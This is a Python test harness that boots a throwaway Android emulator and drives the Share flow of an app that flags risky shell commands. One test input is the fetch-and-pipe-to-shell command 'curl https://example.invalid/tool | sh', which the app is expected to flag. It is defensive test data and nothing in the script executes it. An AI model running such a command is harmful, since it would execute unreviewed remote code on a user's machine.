#!/usr/bin/env python3
"""Exercise synthetic Share flows on a disposable hosted Android emulator."""
import argparse
import datetime as dt
import hashlib
import json
import os
from pathlib import Path
import re
import selectors
import shlex
import shutil
import subprocess
import signal
import stat
import tempfile
import time
import urllib.error
import urllib.request
import xml.etree.ElementTree as ET

ROOT=Path(__file__).resolve().parents[1]
PACKAGE='com.aitrustid.android'
COMPONENT=PACKAGE+'/.CheckActivity'
IMAGE='system-images;android-36;default;x86_64'
LICENSE_HASH='efa68a6b3c661d18699d5c026771d5911cdc2f83'
GOOGLE_REPOSITORY='https://dl.google.com/android/repository/'
METADATA_LIMIT=4*1024*1024
DISK_MINIMUM=6*1024**3
SDK_TIMEOUT_SECONDS=270
SDK_OUTPUT_LIMIT=1024*1024
PACKAGES={
    'emulator':('repository2-3.xml','37.3.10','emulator-linux_x64-16970787.zip',350068887,'5f7314368fc6c05c937f6991bb4106214dc389e7'),
    IMAGE:('sys-img/android/sys-img2-3.xml','2','x86_64-36_r02.zip',844217077,'829c076e8ff448a336097ae25a355b495ba36e2c'),
}


def existing_license_record(path):
    """Read only a bounded regular SDK acceptance record; never accept a license."""
    fd=os.open(path,os.O_RDONLY|os.O_NOFOLLOW|os.O_NONBLOCK)
    try:
        info=os.fstat(fd)
        if not stat.S_ISREG(info.st_mode) or not 0<info.st_size<=8192:
            raise ValueError('Existing SDK license record unavailable')
        raw=os.read(fd,8193)
        if len(raw)>8192 or not raw.strip():
            raise ValueError('Existing SDK license record unavailable')
        lines=raw.decode('ascii').splitlines()
        if not all(not line.strip() or re.fullmatch('[0-9a-f]{40}',line.strip()) for line in lines):
            raise ValueError('Existing SDK license record malformed')
        return raw
    finally:
        os.close(fd)


def sdk_install(argv):
    """Run the existing manager with closed stdin and bounded private diagnostics."""
    with subprocess.Popen(argv,stdin=subprocess.DEVNULL,stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT,start_new_session=True) as process:
        output=bytearray();deadline=time.monotonic()+SDK_TIMEOUT_SECONDS;completed=False
        try:
            with selectors.DefaultSelector() as selector:
                selector.register(process.stdout,selectors.EVENT_READ)
                while selector.get_map():
                    left=deadline-time.monotonic()
                    if left<=0:raise ValueError('Reviewed SDK install timeout')
                    for key,_ in selector.select(min(left,1)):
                        chunk=os.read(key.fileobj.fileno(),16384)
                        if not chunk:
                            selector.unregister(key.fileobj)
                        else:
                            output.extend(chunk)
                            if len(output)>SDK_OUTPUT_LIMIT:
                                raise ValueError('Reviewed SDK diagnostics exceeded limit')
            code=process.wait(timeout=max(.001,deadline-time.monotonic()))
            completed=True
            return code,bytes(output)
        finally:
            # On error this unreaped child still reserves the owned group ID.
            # Do not kill a numeric process/group ID after successful wait/reap.
            if not completed and process.returncode is None:
                try:os.killpg(process.pid,signal.SIGKILL)
                except ProcessLookupError:pass
            process.wait(timeout=5)


class MetadataRefusal(ValueError):
    """Only fixed, non-sensitive metadata boundaries may reach the public report."""
    CODES=frozenset({'metadata_http_status','metadata_redirect','metadata_transport',
        'metadata_size','metadata_parse','metadata_license_drift',
        'metadata_package_drift','metadata_revision_drift','metadata_archive_drift'})

    def __init__(self,code):
        if code not in self.CODES:raise ValueError('Invalid metadata diagnostic code')
        self.code=code
        super().__init__(code)


class RejectMetadataRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self,req,fp,code,msg,headers,newurl):
        raise MetadataRefusal('metadata_redirect')


def require_metadata_identity(package, expected):
    relative,revision,archive_name,archive_size,checksum=expected
    url=GOOGLE_REPOSITORY+relative
    try:
        with urllib.request.build_opener(RejectMetadataRedirect()).open(url,timeout=15) as response:
            if response.geturl()!=url:raise MetadataRefusal('metadata_redirect')
            if response.status!=200:raise MetadataRefusal('metadata_http_status')
            raw=response.read(METADATA_LIMIT+1)
    except MetadataRefusal:raise
    except urllib.error.HTTPError:
        raise MetadataRefusal('metadata_http_status') from None
    except (OSError,urllib.error.URLError):
        raise MetadataRefusal('metadata_transport') from None
    if len(raw)>METADATA_LIMIT:
        raise MetadataRefusal('metadata_size')
    try:root=ET.fromstring(raw)
    except ET.ParseError:raise MetadataRefusal('metadata_parse') from None
    licenses=[node for node in root.findall('license') if node.get('id')=='android-sdk-license']
    if len(licenses)!=1 or hashlib.sha1((licenses[0].text or '').encode()).hexdigest()!=LICENSE_HASH:
        raise MetadataRefusal('metadata_license_drift')
    candidates=[node for node in root.findall('remotePackage') if node.get('path')==package and
                (node.find('channelRef') is None or node.find('channelRef').get('ref')=='channel-0')]
    if len(candidates)!=1:
        raise MetadataRefusal('metadata_package_drift')
    selected=candidates[0]
    revision_node=selected.find('revision')
    if revision_node is None or not len(revision_node) or any(not node.text for node in revision_node):
        raise MetadataRefusal('metadata_parse')
    declared='.'.join(node.text for node in revision_node)
    if declared!=revision:raise MetadataRefusal('metadata_revision_drift')
    license_node=selected.find('uses-license')
    if license_node is None or license_node.get('ref')!='android-sdk-license':
        raise MetadataRefusal('metadata_license_drift')
    matches=[node.find('complete') for node in selected.findall('archives/archive')
             if node.findtext('host-os') in (None,'linux') and node.find('complete') is not None
             and node.find('complete').findtext('url')==archive_name]
    if (len(matches)!=1 or matches[0].findtext('size')!=str(archive_size)
            or matches[0].findtext('checksum')!=checksum):
        raise MetadataRefusal('metadata_archive_drift')
    return {'package':package,'metadata_sha256':hashlib.sha256(raw).hexdigest(),
            'metadata_bytes':len(raw),'revision':declared,'license_sha1':LICENSE_HASH}


def installed_revision(component):
    descriptor=component/'source.properties'
    with descriptor.open('rb') as stream:
        raw=stream.read(8193)
    if len(raw)>8192:
        raise ValueError('Installed SDK descriptor exceeded the review limit')
    match=re.findall(r'^Pkg\.Revision\s*=\s*([0-9.]+)\s*$',raw.decode('utf-8'),re.MULTILINE)
    return match[0] if len(match)==1 else None


def prepare_emulator(sdk, report):
    manager=sdk/'cmdline-tools/latest/bin/sdkmanager'
    avd=sdk/'cmdline-tools/latest/bin/avdmanager'
    adb=sdk/'platform-tools/adb'
    emulator=sdk/'emulator/emulator'
    image=sdk/'system-images/android-36/default/x86_64/system.img'
    license_file=sdk/'licenses/android-sdk-license'
    try:license_raw=existing_license_record(license_file)
    except (OSError,ValueError,UnicodeError):license_raw=b''
    inventory={
        'github_hosted_linux':os.environ.get('GITHUB_ACTIONS')=='true' and os.environ.get('AITRUST_ANDROID_RUNNER')=='github-hosted' and os.environ.get('RUNNER_OS')=='Linux',
        'sdkmanager':os.access(manager,os.X_OK),'avdmanager':os.access(avd,os.X_OK),'adb':os.access(adb,os.X_OK),
        'emulator_preinstalled':os.access(emulator,os.X_OK),'aosp_image_preinstalled':image.is_file(),
        'kvm_device_exists':Path('/dev/kvm').exists(),'kvm_access':os.access('/dev/kvm',os.R_OK|os.W_OK),
        'existing_license_record':bool(license_raw),
        'metadata_license_hash_recorded':LICENSE_HASH.encode() in license_raw.splitlines(),
        'sdk_writable':os.access(sdk,os.W_OK),'sdk_free_bytes':shutil.disk_usage(sdk).free,
    }
    report['prerequisites']=inventory
    required=['github_hosted_linux','sdkmanager','avdmanager','adb','kvm_access','existing_license_record']
    missing=[key for key in required if not inventory[key]]
    if missing:
        report['reason']='Existing disposable runner prerequisites unavailable.'
        report['missing_prerequisites']=missing
        return None
    if (inventory['emulator_preinstalled'] and installed_revision(emulator.parent)!=PACKAGES['emulator'][1]
        or inventory['aosp_image_preinstalled'] and installed_revision(image.parent)!=PACKAGES[IMAGE][1]):
        raise ValueError('Installed SDK package revision differs from review')
    needed=[key for key,present in [('emulator',inventory['emulator_preinstalled']),(IMAGE,inventory['aosp_image_preinstalled'])] if not present]
    report['bound_revisions']={key:value[1] for key,value in PACKAGES.items()}
    report['requested_packages']=needed
    report['existing_license_record_sha256']=hashlib.sha256(license_raw).hexdigest()
    report['sdk_license_acceptance_inferred_from_metadata_hash']=False
    if needed:
        if not inventory['sdk_writable'] or inventory['sdk_free_bytes']<DISK_MINIMUM:
            report['reason']='Hosted SDK directory lacks write access or download space.'
            return None
        report['phase']='reviewed_metadata'
        report['metadata_reviews']=[]
        for package in needed:
            report['metadata_reviews'].append(require_metadata_identity(package,PACKAGES[package]))
        report['phase']='sdk_install'
        try:
            code,diagnostics=sdk_install([str(manager),f'--sdk_root={sdk}','--channel=0','--install',*needed])
        finally:
            if existing_license_record(license_file)!=license_raw:
                raise ValueError('SDK license record changed unexpectedly')
        report['license_record_unchanged']=True
        if re.search(rb'\blicenses?\b[^\r\n]{0,512}\bnot (?:been )?accepted\b',diagnostics,re.I):
            report['reason']='The SDK manager refused installation under its existing license record.'
            report['missing_prerequisites']=['existing_sdk_license_acceptance']
            return None
        if code or not os.access(emulator,os.X_OK) or not image.is_file():
            raise ValueError('Reviewed SDK install failed with closed stdin')
    if installed_revision(emulator.parent)!=PACKAGES['emulator'][1] or installed_revision(image.parent)!=PACKAGES[IMAGE][1]:
        raise ValueError('Installed SDK package version differs from review')
    return adb,emulator,avd


class AndroidControlRefusal(ValueError):
    """Fixed owned-control boundaries; never native command details."""
    STAGES={
        'share_first_send':'share_first_send_unavailable',
        'share_first_receive':'share_first_receive_unavailable',
        'share_explicit_check':'share_automatic_finding_observed',
        'share_finding_tap':'share_finding_tap_unavailable',
        'share_finding_view':'share_finding_view_unavailable',
        'share_finding_tag':'share_finding_tag_unavailable',
        'share_edit':'share_edit_unavailable',
        'share_edit_view':'share_edit_view_unavailable',
        'share_edit_tag_absence':'share_old_tag_retained',
        'share_replacement_send':'share_replacement_send_unavailable',
        'share_replacement_receive':'share_replacement_receive_unavailable',
        'share_replacement_tap':'share_replacement_tap_unavailable',
        'share_replacement_view':'share_replacement_view_unavailable',
        'share_mime_send':'share_mime_send_unavailable',
        'share_mime_view':'share_mime_view_unavailable',
        'share_clear_send':'share_clear_send_unavailable',
        'share_clear_receive':'share_clear_receive_unavailable',
        'share_clear_tap':'share_clear_tap_unavailable',
        'share_clear_view':'share_clear_view_unavailable',
        'share_clear_text_absence':'share_cleared_text_retained',
        'background_receive':'background_receive_unavailable',
        'background_home':'background_home_unavailable',
        'background_task_inventory':'background_task_inventory_unavailable',
        'background_task_lookup':'background_owned_task_unavailable',
        'background_refocus':'background_refocus_unavailable',
        'background_cleared_view':'background_cleared_view_unavailable',
        'background_marker_absence':'background_marker_retained',
    }

    def __init__(self,stage):
        if stage not in self.STAGES:raise ValueError('Invalid Android control diagnostic')
        self.code=self.STAGES[stage]
        super().__init__(self.code)


def owned_ui_observation(view):
    """Fixed booleans only, from an already read synthetic foreground hierarchy."""
    nodes=list(view.iter('node'))
    def text(value):return any(value in n.attrib.get('text','') for n in nodes)
    editor=[n for n in nodes if n.attrib.get('resource-id')==PACKAGE+':id/editor']
    return {
        'owned_ui_present':any(n.attrib.get('resource-id','').startswith(PACKAGE+':id/') for n in nodes),
        'owned_editor_present':bool(editor),
        'owned_editor_nonempty':any(bool(n.attrib.get('text','')) for n in editor),
        'received_text_present':text('Text received. Review it'),
        'ready_text_present':text('Ready when you are.'),
        'cleared_text_present':text('Cleared. Your text and result'),
        'changed_text_present':text('Text changed. Tap Check'),
        'finding_text_present':text('Review before running this command.'),
        'no_finding_text_present':text('No supported command pattern found.'),
        'unsupported_mime_text_present':text('Files and multiple items are not supported.'),
        'unavailable_text_present':text('PS is unavailable.'),
        'tag_ps_present':any(n.attrib.get('resource-id')==PACKAGE+':id/tag' and n.attrib.get('text')=='PS' for n in nodes),
        'first_synthetic_text_present':text('curl https://example.invalid/tool | sh'),
        'system_ui_present':any(n.attrib.get('package')=='com.android.systemui' for n in nodes),
        'launcher_ui_present':any(n.attrib.get('package')=='com.android.launcher3' for n in nodes),
        'platform_error_dialog_present':any(n.attrib.get('resource-id') in ('android:id/aerr_close','android:id/aerr_restart') for n in nodes),
    }


def share_start_observation(raw):
    """Do not retain am-start output; these hints never grant acceptance."""
    return {
        'status_ok_reported':bool(re.search(rb'^Status: ok\r?$',raw,re.M)),
        'status_timeout_reported':bool(re.search(rb'^Status: timeout\r?$',raw,re.M)),
        'error_reported':bool(re.search(rb'^Error:',raw,re.M)),
        'warning_reported':bool(re.search(rb'^Warning:',raw,re.M)),
        'owned_component_reported':COMPONENT.encode() in raw,
    }


LIFECYCLE_EVENT_PROFILES={
    'wm_create_activity':(8,3),'wm_new_intent':(8,3),'wm_relaunch_activity':(5,3),
    'wm_on_create_called':(4,1),'wm_on_resume_called':(4,1),
    'wm_on_paused_called':(4,1),'wm_on_stop_called':(4,1),
}
LIFECYCLE_EVENT_LIMIT=128
LIFECYCLE_METADATA_BYTES=65536


def lifecycle_event_observation(raw):
    """Reduce bounded AOSP event records to exact-owned finite metadata only.

    Components/actions occupy verified schema positions. Remaining fields may
    contain private URI/reason data; they are never copied into the result.
    Counts mean matching log records, not proof of unlogged lifecycle behavior.
    """
    unavailable={'state':'UNAVAILABLE','reason':'lifecycle_metadata_unavailable'}
    if not isinstance(raw,bytes) or len(raw)>LIFECYCLE_METADATA_BYTES:return unavailable
    try:lines=raw.decode('utf-8','strict').splitlines()
    except UnicodeError:return unavailable
    if len(lines)>LIFECYCLE_EVENT_LIMIT+4:return unavailable
    counts={tag:0 for tag in LIFECYCLE_EVENT_PROFILES}
    actions={tag:{'SEND':0,'MAIN':0,'OTHER':0} for tag in ('wm_create_activity','wm_new_intent')}
    sequence=[];unparsed=0;selected=0
    components={COMPONENT,PACKAGE+'/'+PACKAGE+'.CheckActivity',PACKAGE+'.CheckActivity'}
    for line in lines:
        match=re.fullmatch(r'[VDIWEF]/(wm_[a-z_]+)\s*\(\s*\d+\):\s*(.*)',line)
        if not match:
            if line.strip() and not line.startswith('---------'):unparsed+=1
            continue
        if match[1] not in LIFECYCLE_EVENT_PROFILES:continue
        selected+=1
        if selected>LIFECYCLE_EVENT_LIMIT:return unavailable
        tag=match[1];body=match[2];size,index=LIFECYCLE_EVENT_PROFILES[tag]
        if not body.startswith('[') or not body.endswith(']'):
            unparsed+=1;continue
        values=[part.strip() for part in body[1:-1].split(',')]
        if len(values)!=size or any(not re.fullmatch(r'-?\d{1,20}',v) for v in values[:index]):
            unparsed+=1;continue
        if values[index] not in components:continue
        counts[tag]+=1
        if tag in actions:
            action={'android.intent.action.SEND':'SEND','android.intent.action.MAIN':'MAIN'}.get(values[4],'OTHER')
            actions[tag][action]+=1;sequence.append(tag+':'+action)
        else:sequence.append(tag)
    matched=sum(counts.values())
    return {'state':'PARTIAL' if unparsed else ('OBSERVED' if matched else 'NO_MATCHING_OWNED_EVENTS'),
            'observed_event_counts':counts,'observed_start_actions':actions,
            'observed_sequence':sequence,'unparsed_selected_records':unparsed,
            'absence_proves_no_callback':False}


def collect_first_failure_metadata(shell):
    """One read-only, capped, failure-only discriminator in the owned AVD."""
    args=['logcat','-b','events','-d','-t',str(LIFECYCLE_EVENT_LIMIT),'-v','brief']
    args += [tag+':I' for tag in LIFECYCLE_EVENT_PROFILES]+['*:S']
    try:return lifecycle_event_observation(shell(args,5))
    except Exception:return {'state':'UNAVAILABLE','reason':'lifecycle_metadata_unavailable'}


def verify_share_controls(send,shell,wait,click,report,cases,first_failure_metadata=None):
    """Original first six controls; diagnostic stages do not change acceptance."""
    def text(view,value):return any(value in n.attrib.get('text','') for n in view.iter('node'))
    try:
        report['control_stage']='share_first_send'
        send('curl https://example.invalid/tool | sh')
        report['control_stage']='share_first_receive'
        view=wait(lambda x:text(x,'Text received. Review it'))
        report['control_stage']='share_explicit_check'
        assert not text(view,'Review before running this command.')
        cases.append({'case':'receive_requires_explicit_check','pass':True})
        report['control_stage']='share_finding_tap'
        click(view,'check')
        report['control_stage']='share_finding_view'
        view=wait(lambda x:text(x,'Review before running this command.'))
        report['control_stage']='share_finding_tag'
        assert any(n.attrib.get('resource-id')==PACKAGE+':id/tag' and n.attrib.get('text')=='PS' for n in view.iter('node'))
        cases.append({'case':'actual_offline_ps_finding','pass':True})
        report['control_stage']='share_edit'
        click(view,'editor');shell(['input','text','X'])
        report['control_stage']='share_edit_view'
        view=wait(lambda x:text(x,'Text changed. Tap Check'))
        report['control_stage']='share_edit_tag_absence'
        assert not any(n.attrib.get('resource-id')==PACKAGE+':id/tag' for n in view.iter('node'))
        cases.append({'case':'edit_hides_previous_finding','pass':True})
        report['control_stage']='share_replacement_send'
        send('printf hello')
        report['control_stage']='share_replacement_receive'
        view=wait(lambda x:text(x,'Text received. Review it'))
        report['control_stage']='share_replacement_tap'
        click(view,'check')
        report['control_stage']='share_replacement_view'
        wait(lambda x:text(x,'No supported command pattern found.'))
        cases.append({'case':'new_share_and_no_finding','pass':True})
        report['control_stage']='share_mime_send'
        send('ignored','image/png')
        report['control_stage']='share_mime_view'
        wait(lambda x:text(x,'Files and multiple items are not supported.'))
        cases.append({'case':'unsupported_mime_has_no_verdict','pass':True})
        report['control_stage']='share_clear_send'
        send('printf hello')
        report['control_stage']='share_clear_receive'
        view=wait(lambda x:text(x,'Text received. Review it'))
        report['control_stage']='share_clear_tap'
        click(view,'clear')
        report['control_stage']='share_clear_view'
        view=wait(lambda x:text(x,'Cleared. Your text and result'))
        report['control_stage']='share_clear_text_absence'
        assert not text(view,'printf hello')
        cases.append({'case':'clear_removes_input_and_result','pass':True})
    except AndroidControlRefusal:raise
    except (OSError,ValueError,KeyError,TypeError,AttributeError,AssertionError,StopIteration,ET.ParseError,subprocess.SubprocessError):
        if not cases and first_failure_metadata is not None:
            # The primary refusal remains authoritative if diagnostics fail.
            try:report['first_failure_lifecycle']=first_failure_metadata()
            except Exception:report['first_failure_lifecycle']={'state':'UNAVAILABLE','reason':'lifecycle_metadata_unavailable'}
        raise AndroidControlRefusal(report['control_stage']) from None


def verify_background_clear(send,shell,wait,report):
    """Run the original seventh control, retaining only fixed failure boundaries.

    No new intent, command, delay, retry or success path is introduced. UI flags
    describe the already observed foreground hierarchy, not lifecycle completion.
    """
    def text(view,value):return any(value in n.attrib.get('text','') for n in view.iter('node'))
    def cleared(view):
        ready=text(view,'Ready when you are.')
        wiped=text(view,'Cleared. Your text and result')
        report['background_observation']={
            'owned_ui_present':any(n.attrib.get('resource-id','').startswith(PACKAGE+':id/') for n in view.iter('node')),
            'ready_text_present':ready,'cleared_text_present':wiped,
            'synthetic_marker_present':text(view,'synthetic private marker'),
        }
        return ready or wiped
    try:
        report['control_stage']='background_receive'
        send('synthetic private marker');wait(lambda x:text(x,'Text received. Review it'))
        report['control_stage']='background_home'
        shell(['input','keyevent','KEYCODE_HOME'])
        # Preserve the same task refocus, without a fresh Share/launcher intent
        # that could wipe the editor and mask broken onStop behavior.
        report['control_stage']='background_task_inventory'
        tasks=shell(['dumpsys','activity','activities']).decode()
        report['control_stage']='background_task_lookup'
        matches=re.findall(r'Task\{[^\n]*#(\d+)[^\n]*'+re.escape(PACKAGE),tasks)
        report['background_owned_task_matches']=len(matches)
        if not matches:raise AndroidControlRefusal('background_task_lookup')
        report['control_stage']='background_refocus'
        shell(['am','task','focus',matches[0]])
        report['control_stage']='background_cleared_view'
        view=wait(cleared)
        report['control_stage']='background_marker_absence'
        assert not text(view,'synthetic private marker')
    except AndroidControlRefusal:raise
    except (OSError,ValueError,KeyError,TypeError,AttributeError,AssertionError,StopIteration,ET.ParseError,subprocess.SubprocessError):
        raise AndroidControlRefusal(report['control_stage']) from None


def main():
    parser=argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--sdk-root',required=True);parser.add_argument('--apk',required=True)
    args=parser.parse_args();output=ROOT/'output/android-share/emulator.json';cases=[];process=None;started=time.monotonic();avd_home=None
    report={'format':'ai-trust-id-android-emulator/v1','recorded_at':dt.datetime.now(dt.timezone.utc).isoformat(),'status':'UNAVAILABLE','pass':False,'physical_device_evidence':False,'independent_accuracy_evidence':False,'cases':cases}
    try:
        sdk=Path(args.sdk_root).resolve(strict=True)
        prepared=prepare_emulator(sdk,report)
        if prepared is None:return 0
        adb,emulator,avd=prepared
        avd_home=tempfile.TemporaryDirectory(prefix='aitrust-share-avd-',dir=os.environ['RUNNER_TEMP'])
        env={**os.environ,'ANDROID_AVD_HOME':avd_home.name}
        def run(argv,timeout=10,input_bytes=b''):
            p=subprocess.run([str(x) for x in argv],input=input_bytes,capture_output=True,env=env,timeout=timeout)
            if p.returncode:raise ValueError('Emulator command failed')
            if len(p.stdout)>524288:raise ValueError('Oversized emulator reply')
            return p.stdout
        # A fixed dedicated emulator name/port prevents selecting a connected phone.
        devices=run([adb,'devices']).decode()
        if 'emulator-5580' in devices:raise ValueError('Dedicated emulator port already occupied')
        report['phase']='create_avd'
        run([avd,'create','avd','--name','aitrust-share-ci','--package',IMAGE],timeout=20,input_bytes=b'no\n')
        report['phase']='boot'
        process=subprocess.Popen([str(emulator),'-avd','aitrust-share-ci','-port','5580','-no-window','-no-audio','-no-boot-anim','-no-snapshot','-wipe-data','-gpu','swiftshader','-memory','2048','-cores','2'],env=env,stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        def shell(argv,timeout=10):return run([adb,'-s','emulator-5580','shell',shlex.join([str(x) for x in argv])],timeout)
        boot=time.monotonic()+90
        while time.monotonic()<boot:
            if process.poll() is not None:raise ValueError('Owned emulator stopped')
            try:
                if shell(['getprop','sys.boot_completed'],5).strip()==b'1':break
            except (ValueError,subprocess.SubprocessError):pass
            time.sleep(1)
        else:raise ValueError('Owned emulator boot timeout')
        report['phase']='install_apk'
        run([adb,'-s','emulator-5580','install','--no-streaming',args.apk],timeout=30)
        shell(['wm','dismiss-keyguard'])
        shell(['svc','wifi','disable']);shell(['svc','data','disable'])
        report['phase']='share_controls'
        def tree():
            report['ui_operation']='dump'
            shell(['uiautomator','dump','/sdcard/aitrust-synthetic-window.xml'],10)
            report['ui_operation']='read'
            raw=shell(['cat','/sdcard/aitrust-synthetic-window.xml'],5)
            report['ui_operation']='parse'
            view=ET.fromstring(raw)
            report['last_ui_observation']=owned_ui_observation(view)
            report['ui_operation']='observed'
            return view
        def wait(predicate,seconds=40):
            deadline=time.monotonic()+seconds
            while time.monotonic()<deadline:
                view=tree()
                if predicate(view):return view
                time.sleep(.2)
            raise ValueError('Expected Android UI state unavailable')
        def text(view,value):return any(value in n.attrib.get('text','') for n in view.iter('node'))
        def click(view,rid):
            node=next(n for n in view.iter('node') if n.attrib.get('resource-id')==PACKAGE+':id/'+rid)
            coords=list(map(int,re.fullmatch(r'\[(\d+),(\d+)\]\[(\d+),(\d+)\]',node.attrib['bounds']).groups()))
            shell(['input','tap',(coords[0]+coords[2])//2,(coords[1]+coords[3])//2])
        def send(value,kind='text/plain',action='android.intent.action.SEND'):
            report.pop('share_start_observation',None)
            report['share_start_observation']=share_start_observation(shell(['am','start','-W','-a',action,'-t',kind,'--es','android.intent.extra.TEXT',value,'-n',COMPONENT],20))
        verify_share_controls(send,shell,wait,click,report,cases,lambda:collect_first_failure_metadata(shell))
        verify_background_clear(send,shell,wait,report)
        cases.append({'case':'background_clears_text','pass':True})
        permission_occurrences=shell(['dumpsys','package',PACKAGE]).decode().count('android.permission.INTERNET')
        if permission_occurrences:raise ValueError('Unexpected Android Internet permission')
        report.update(status='EXECUTED',phase='complete',**{'pass':True},api_level=shell(['getprop','ro.build.version.sdk']).decode().strip(),case_count=len(cases),internet_permission=False)
        return 0
    except MetadataRefusal as error:
        report.update(status='FAILED',reason='Reviewed official SDK metadata was refused.',diagnostic_code=error.code);return 1
    except AndroidControlRefusal as error:
        report.update(status='FAILED',reason='An owned Android Share control did not complete.',diagnostic_code=error.code);return 1
    except (OSError,ValueError,KeyError,TypeError,AttributeError,AssertionError,StopIteration,ET.ParseError,subprocess.SubprocessError):
        report.update(status='FAILED',reason='A required owned-emulator share, lifecycle or offline check did not complete.');return 1
    finally:
        if process is not None:
            process.terminate()
            try:process.wait(timeout=10)
            except subprocess.TimeoutExpired:process.kill();process.wait(timeout=5)
        if avd_home is not None:avd_home.cleanup()
        report['elapsed_seconds']=round(time.monotonic()-started,3)
        output.parent.mkdir(parents=True,exist_ok=True);output.write_text(json.dumps(report,indent=2)+'\n');print(json.dumps(report,indent=2))
if __name__=='__main__':raise SystemExit(main())
